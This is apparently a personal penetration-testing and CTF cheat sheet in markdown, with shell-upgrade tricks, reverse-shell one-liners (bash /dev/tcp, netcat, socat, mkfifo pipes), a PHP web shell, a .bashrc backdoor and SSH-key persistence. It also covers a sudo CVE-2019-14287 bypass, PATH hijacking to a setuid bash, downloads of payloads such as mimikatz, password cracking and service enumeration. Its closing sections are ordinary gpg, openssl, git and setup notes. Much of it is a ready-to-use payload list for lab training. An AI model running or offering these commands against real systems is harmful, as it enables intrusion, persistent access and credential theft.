# Shell ✅
```bash
/bin/bash -ip
perl -e 'exec "/bin/bash";'
SHELL=/bin/bash script -q /dev/null
python3 -c 'import pty;pty.spawn("/bin/bash")'
---------------------------------------------------------------------
use post/multi/manage/shell_to_meterpreter # metaslpoit 
---------------------------------------------------------------------
CTRL + Z
stty raw -echo;fg
reset
export SHELL=/bin/bash
export TERM=xterm
stty rows 52 columns 209 
---------------------------------------------------------------------
socat TCP-L:<port> # in our system
socat TCP-L:<port> FILE:`tty`,raw,echo=0  # in our system

socat TCP:<local-ip>:<local-port> EXEC:"bash -li" # in our system for linux
socat TCP:<local-ip>:<local-port> EXEC:powershell.exe,pipes # in our system for windows

socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane # in target system
---------------------------------------------------------------------
# in target
mkdir -p ~/.ssh/
ssh-keygen
cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrUuxHUQfisszFPV0fByg09czHmKW/z9JmTX4ecVROw mobin@solcoteh' >> ~/.ssh/authorized_keys
# transfer id_rsa target file to our kali 
# in our kali 
chmod 600 id_rsa 
ssh user@10.10.10.10 -i id_rsa  
---------------------------------------------------------------------
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> ~/.bashrc # backdoor in target
---------------------------------------------------------------------
sudo echo "10.10.10.10 webenum.thm" >> /etc/hosts
sudo echo "10.10.10.10 mysubdomain.webenum.thm" >> /etc/hosts
---------------------------------------------------------------------
sudo -u#-1 /bin/bash # CVE-2019-14287 
---------------------------------------------------------------------
sudo -u silvio /usr/bin/zip # run with another user
sudo -u jordan PYTHONPATH=/tmp /opt/scripts/flag.py # run with PYTHONPATH 

export PATH=/tmp:$PATH
export PYTHONPATH=/tmp:$PYTHONPATH
echo 'import pty;pty.spawn("/bin/bash")' >> /tmp/shop.py
echo 'cp /bin/bash /tmp/bash ; chmod +s /tmp/bash' > /tmp/systemctl
echo "bash -i >& /dev/tcp/10.9.3.23/4444 0>&1" >> /opt/scripts/flag.sh
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
```
[full-ttys](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/full-ttys)

[spawning-tty-shells](https://hideandsec.sh/books/cheatsheets-82c/page/spawning-tty-shells)

[9-ways-to-backdoor-a-linux-box](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c)

[upgrading-simple-shells-to-fully-interactive-ttys](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys)

# Payloads_Shell ✅
```bash
<?php echo system($_GET["cmd"]); ?>
nc 10.11.99.141 5555 -e bash
ncat 10.11.99.141 5555 -e bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
/bin/bash -c /bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
msfvenom -p cmd/unix/reverse_netcat lhost=10.10.10.10 lport=8888 R
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
```
[Other_Reverse_Shell_Site](https://tex2e.github.io/reverse-shell-generator/index.html)

[Pentestmonkey-Reverse-Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

[PayloadsAllTheThings-Reverse-shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

# Port-Forwarding ✅
## SSH ✡️
```bash
ssh 10.10.10.10 -i id_rsa -D 1337 # use proxychane
ssh -L 7777:localhost:80 user@10.10.10.10 # (YOU <-- CLIENT) transfer port from target system to our system
ssh -R 80:localhost:9999 user@10.10.10.10 # (YOU --> CLIENT) transfer port from our system to target system
ssh -C2qTnN -D 1080 user@10.10.10.10
ssh -t -D 8157 solcoteh@10.10.10.10 -p 222
ssh -tt -L8080:localhost:8157 solcoteh@10.10.10.10

-oHostKeyAlgorithms=+ssh-rsa
-oPubkeyAcceptedKeyTypes=+ssh-rsa
```
## Chisel ✡️
```bash
gh repo clone jpillora/chisel
go install github.com/jpillora/chisel@latest
```
[Port-Forwarding](https://fumenoid.github.io/posts/port-forwarding)

# Remote-Desktop with kali-linux ✅
### xfreerdp ✡️
```bash
xfreerdp /v:$ip:3389 
xfreerdp /u:Administrator /v:$ip:3389 
xfreerdp /u:Administrator /p:password /v:$ip:3389 
xfreerdp /u:Administrator /p:password /v:$ip:3389 /cert:ignore
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:$ip:3389 /u:Administrator /p:'password'
```

# File_Transfer ✅
## linux ✅
```bash
python3 -m http.server 8000
wget http://10.10.10.10:8000/linpeas.sh
curl http://10.10.10.10:8000/linpeas.sh -O linpeas.sh
curl --path-as-is http://10.10.10.10:8000/../../../../linpeas.sh -O linpeas.sh
```
## windows ✅
```bash 
certutil -urlcache -split -f http://10.10.10.10:8000/namefile.txt C:\Users\Public\namefile.txt
powershell -c wget "http://10.10.10.10:8000/namefile.txt" -OutFile "C:\Windows\Temp\namefile.txt"
powershell -c "Invoke-WebRequest -Uri 'http://10.10.10.10:8000/namefile.txt' -OutFile 'C:\Windows\Temp\namefile.txt'"
bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.10.10:8000/namefile.txt C:\Users\temp\namefile.txt
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.10.10:8000/callhome.exe','callhome.exe')"

c:\Python27\python.exe -c "import urllib; print urllib.urlopen('http://10.10.10.10:8000/mimikatz_trunk.zip').read()" > mimikatz_trunk.zip
```
# Enumeration ✅📚
## Ports_Scan_Enumeration ✅
```bash
ip=10.10.93.52

sudo nmap -p- $ip -sV -T5
sudo nmap -p- $ip -sV -T5 -Pn
sudo nmap 139,445 --script=vuln $ip -T5 
sudo nmap -p 139,445 --script=vuln $ip -T5 -Pn
sudo rustscan -a $ip -p 139,445 -- --script=vuln -T5

sudo rustscan -a $ip -- -sV -T5
sudo nmap -p $PORTS -sV $ip -T5
PORTS=$(sudo nmap -p- $ip -T5 | grep -oE '[0-9]{1,5}/' | tr -d '\n' | tr '/' ',' | sed 's/,$//')
```
## Target_Enumeration_With_proxychane ✅
```bash
ssh 10.10.217.6 -i id_rsa -D 1337
sudo nano /etc/proxychains4.conf # to end file and change  ( socks5 127.0.0.1 1337 )
sudo proxychains4 ip a # run "ip a" command in our kali but exce in target
sudo proxychains4 nmap -sT 127.0.0.1 # port target scan in our kali
sudo proxychains4 nmap -sn 10.10.233.188/24 # ip target scan in our kali
sudo ssh errorcauser@10.10.217.6 -i id_rsa -L 8000:127.0.0.1:80 # (YOU <-- CLIENT) transfer port from target system to our system
```

[Automate Tool](https://github.com/solcoteh/NmapScan_Automate)

## Network_Scan_Enumeration ✅
```bash
sudo nmap -sn 10.10.10.0/24 -T5
sudo rustscan -a 10.10.10.0/24
sudo netdiscover -f -r 10.10.10.0/24 -i eth0 -P
```

# Brute Force Attack ✅📚
## Crack Type Cheat Sheet ✅
```bash
hashcat -m 0 -a 0 hash.txt wordlist.txt
hashcat -m <hash_type> -a <attack_mode> hashfile wordlist

gpp-decrypt [hash] # Group Policy Preferences (GPP)
ncrack -vv --user username -P password-file.txt rdp://[host] # Ncrack can be used to crack RDP passwords:
```
[example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

## Hydra Attack Type Cheat Sheet ✅
```bash
hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -vV $ip ftp
```
## Crack-ssh-Pubkey-To-Privatekey ✅
```bash
git clone https://github.com/RsaCtfTool/RsaCtfTool.git

pip install -r requirements.txt

RsaCtfTool.py --publickey ./key.pub --private
```

# service ✅📚
## SMB ✅
#### Default ports 445,139
```bash
enum4linux -a $ip
enum4linux-ng -As $ip
smbclient -L //$ip/ -p 445|139
smbget -R smb://$ip/<share>
smbclient //$ip><share dir> 
smbclient //$ip/<share dir> -p 445|139
smbclient //$ip/<share dir> -U Anonymous -p 445|139
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.138.133
```
## MySQL ✅
#### Default ports 3306
### *enumeration ✡️
```bash
mysql -u root
mysql -u root -p
mysql -h $ip -u root
```
### MySQL commands ✡️
```mysql
show databases;
use <database>;
connect <database>;
show tables;
describe <table_name>;
show columns from <table>;
SELECT VERSION();
select * from <table>;

SELECT * FROM <table_name> WHERE <column_name> LIKE '%search_string%';
```
## SMTP ✅
```bash
telnet INSERTIPADDRESS 25
nc -nvv INSERTIPADDRESS 25
smtp-user-enum -M <MODE> -u <USER> -t <IP>
nmap $ip -p #PORTS -vv -A --script "smtp-*" -oN namp.txt
After finding the username, we will bruteforce <ssh|smb|ftp|nfs> with hydra
```
## NFS ✅
```bash
showmount -e $ip (print NFS shares)

mkdir /tmp/nfs
sudo mount -o rw -t nfs $ip:<share> /tmp/nfs/ -nolock

cat /etc/exports (root_squash OR no_root_squash)

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.138.133
```
## SNMP ✅
```bash
snmpwalk -c public -v1 10.0.0.0
snmpwalk -v X -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
snmpcheck -t 192.168.1.X 
snmpcheck -t 192.168.1.X -c public
onesixtyone -c community.txt -i Found_ips.txt
nmap -sT -p 161 192.168.X.X -oG snmp_results.txt
snmpenum -t 192.168.1.X
nmap -sV -p 161 --script=snmp* 172.20.10.0/24 -T5
braa <community string>@<IP>:.1.3.6.*
```
# Other_useful_tricks ✅
## gpg command cheetsheet ✅
```bash
gpg --import key.gpg # OpenPGP Secret Key
gpg --import key.asc # OpenPGP Secret Key
gpg --import backup.key # OpenPGP Secret Key

gpg -d <file.gpg|pgp> # PGP encrypted session key
gpg --batch --yes -d <file.gpg|pgp> #  PGP encrypted session key
gpg --batch --yes -d <file.gpg|pgp> -o secret.txt  # decrypt 
gpg --batch --yes --passphrase 'passphrase' <file.gpg|pgp> # decrypt 
---------------------------------------------------------
gpg --symmetric --cipher-algo <CIPHER> message.txt # encrypt 
gpg --armor --symmetric --cipher-algo <CIPHER> message.txt # encrypt 
gpg --output original_message.txt --decrypt message.gpg # decrypt 
```
## openssl command cheetsheet ✅
```bash
openssl aes-256-cbc -e -in message.txt -out encrypted_message # encrypt 
openssl aes-256-cbc -pbkdf2 -iter 10000 -e -in message.txt -out encrypted_message # encrypt & more secure 

openssl aes-256-cbc -d -in encrypted_message -out original_message.txt # decrypt 
openssl aes-256-cbc -d -in les-mis.txt.enc -out les-mis.txt -K 58593a7522257f2a95cce9a68886ff78546784ad7db4473dbd91aecd9eefd508 -iv 7a12fd4dc1898efcd997a1b9496e7591  # decrypt  with key & iv

openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123 # decrypt with salt
openssl aes-256-cbc -pbkdf2 -iter 10000 -d -in encrypted_message -out original_message.txt # decrypt & more secure  
----------------------------------
openssl genrsa -out private-key.pem 2048 # generate an RSA private key
openssl dhparam -out dhparams.pem 2048 # generate an RSA Diffie-Hellman-private-key
openssl rsa -in private-key.pem -pubout -out public-key.pem  # generate an RSA public key from private key
----------------------------------
openssl rsa -in private-key.pem -text -noout
openssl dhparam -in dhparams.pem -text -noout

 # The values of p, q, N, e, and d are prime1, prime2, modulus, publicExponent, and privateExponent, respectively.

openssl x509 -in cert.pem -text # view certificate:
----------------------------------
openssl pkeyutl -encrypt -in plaintext.txt -out ciphertext -inkey public-key.pem -pubin # encrypt a file with public-key 
openssl pkeyutl -decrypt -in ciphertext -inkey private-key.pem -out decrypted.txt  # decrypt a file with private-key

# pkeyutl: This stands for "Public Key Utility" and is a command that lets you perform public key operations, like encryption, decryption, signing, and verification.
---------------------------------
openssl req -new -nodes -newkey rsa:4096 -keyout key.pem -out cert.csr # generate a certificate

openssl req -x509 -newkey -nodes rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365 # generate a self-signed certificate.

```

## ICMP_listener ✅
```bash
sudo tshark -i any -f "icmp"
sudo tcpdump ip proto \\icmp -i tun0
```
## Extract ✅
```bash
7z x file.zip
tar -xf archive.tar
gzip -d file.gz
7z x file.zip -p PASSWORD
chromium --ssl-key-log-file=~/ssl-key.log  # dump ssl-key
```
## Git ✅
```bash
git init
git log
git log -p <file>
git diff <commit2> <commit1>
git blame <file>
git show
git checkout <commit|branch ID>
git merge <branch or commit name>
git branch -a
```
# how to use port 22 in firefox ✅
```bash
example = http://hogwartz.com:22
enter "about:config"
search "network.security.ports.banned.override"
Select on "strings"  and [+] 
write "port22"
```
[Other Browser](https://hotspotserver.beabloo.com/unblockPort22.html) 
# install python without root ✅
```bash
wget https://www.python.org/ftp/python/3.9.9/Python-3.9.9.tgz
tar -zxvf Python-3.9.9.tgz
cd Python-3.9.9.tgz
mkdir ~/.localpython
./configure --prefix=/home/$(whoami)/.localpython
make;make install
```
# Connect-Usb-To-WSL ✅
```powershell
wsl --update
wsl --shutdown
winget install --interactive --exact dorssel.usbipd-win


usbipd list
usbipd bind --force --busid  1-4
usbipd attach --wsl --busid 1-4
```
[usbipd-win](https://github.com/dorssel/usbipd-win)

[wsl-usb-gui](https://gitlab.com/alelec/wsl-usb-gui)

[Connecting-USB-devices-to-wsl2](https://hackmd.io/@aeefs2Y8TMms-cjTDX4cfw/r1fqAa_Da)

# Connect with OpenVpn ✅
```bash
/usr/sbin/openvpn --config /etc/thm.ovpn # without proxy 
/usr/sbin/openvpn --config /etc/thm.ovpn --socks-proxy 127.0.0.1 10808 # with proxy
```
# Connect with wireguard ✅
```bash
sudo apt install wireguard
# add vpn-config to /etc/wireguard/vuln.conf
sudo wg-quick up vuln.conf
sudo proxychains4 wg-quick up vuln.conf # with Proxy 
sudo wg # status
```
# useful identifier Hash Tools ✅
```bash
haiti '5460C85BD858A11475115D2DD3A82333' # identify with haiti Tool
hashid '5460C85BD858A11475115D2DD3A82333' # identify with hashid Tool
name-that-hash -t '5460C85BD858A11475115D2DD3A82333' # identify with name-that-hash Tool
hash-identifier '5460C85BD858A11475115D2DD3A82333' # identify with hash-identifier Tool
```
[example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

# generate base64 password ✅
```python
import base64

# Read the password list
with open("passwords.txt", "r") as infile, open("encoded_passwords.txt", "w") as outfile:
    for password in infile:
        encoded_password = base64.b64encode(password.strip().encode()).decode()
        outfile.write(encoded_password + "\n")
```
# Crack Hash with john ✅
```bash
john --single --format=Raw-MD5  hashfile.txt # Single mode brute force attack
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
```
# Crack zip/rar with john ✅
### ZIP ✡️
```bash
zip2john secure.zip  > hashfile.txt
john --format=ZIP  --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
john --format=PKZIP  --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
```
### RAR ✡️
```bash
rar2john secure.rar  > hashfile.txt
john --format=rar  --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
```
# Compile-Run-programs ✅
### python ✡️
```bash
python flag.py
```
### C ✡️
```bash
gcc flag.c -o flag # compile
./flag # run
```
### C++ ✡️
```bash
g++ flag.cpp -o flag # compile
./flag # run
```
### C# ✡️
```bash

```
### java ✡️
```bash
javac file.java # Compile file
java file # run file
```
### ruby ✡️
```bash
ruby your_file.rb
```
